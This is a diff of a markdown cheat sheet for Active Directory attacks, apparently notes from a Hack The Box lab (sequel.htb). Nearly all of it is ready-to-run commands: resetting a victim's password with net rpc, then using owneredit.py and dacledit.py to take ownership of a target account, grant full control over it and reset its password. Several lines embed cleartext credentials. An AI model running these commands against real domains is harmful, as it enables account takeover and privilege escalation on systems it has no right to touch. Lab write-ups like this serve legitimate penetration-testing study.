@@ -217,17 +217,17 @@ net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Pa
 ```
 Change Existing user password
 ```
-net rpc password "JODIE.SUMMERS" "newP@ssword2022" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX"@ -S "192.168.223.30"
+net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
 #### Abusing WriteOwner over User
 ```
 sudo timedatectl set-ntp off                                                                                          
 sudo rdate -n 10.10.11.51 
-python3 owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+python3 owneredit.py -action write -new-owner 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'
 
-python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ControlledUser' -target 'TargetUser' 'domain'/'ControlledUser':'WqSZAF6CysDQbGb3'
 
-net rpc password "ca_svc" "test@password123" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
+net rpc password "TargetUser" "test@password123" -U "sequel.htb"/"ControlledUser"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
 ```
 #### Abusing Active Directory Certificates
 Enumerating vulnerable certificates
